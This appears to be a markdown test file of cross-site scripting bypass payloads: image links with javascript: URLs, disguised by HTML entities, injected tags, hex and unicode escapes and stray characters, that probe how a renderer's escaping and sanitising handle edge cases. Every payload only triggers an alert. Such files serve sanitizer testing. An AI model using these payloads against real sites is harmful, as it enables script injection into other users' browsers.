# HTML Escape Sequence Bypass

## Custom escape function edge cases  
![](javascript:alert('<>&"'[]:()/!()\\'))
![](java<script>:alert('tags'))
![](java&amp;script:alert('amp'))
![](java&quot;script:alert('quot'))
![](java&apos;script:alert('apos'))

## Characters that trigger aggressive escaping
![](test:alert('()'))
![](test:alert('[]'))  
![](test:alert('<>'))
![](test:alert('&"\''))
![](test:alert(':/'))
![](test:alert('!()'))
![](test:alert('\\'))

## Mixed dangerous characters
![](java<script&amp;alert[()]>:test('mixed'))
![](java"script'alert:test('quotes'))

## Edge cases in character detection regex
![](java\x3cscript:alert('hex'))
![](java\u003cscript:alert('unicode'))

## Characters just outside dangerous set
![](javascript#alert('hash'))
![](javascript@alert('at'))  
![](javascript%alert('percent'))
![](javascript~alert('tilde'))
![](javascript+alert('plus'))
![](javascript-alert('hyphen'))
![](javascript_alert('underscore'))

## Escape function regex boundary testing
![](java script:alert('space-start'))
![](javascript:alert ('space-end'))
![](javascript :alert('space-colon'))

## Combining escaped and non-escaped
![](java&lt;script:alert('combo1'))
![](javascript:&gt;alert('combo2'))
![](java&amp;script:alert&lt;'combo3'&gt;))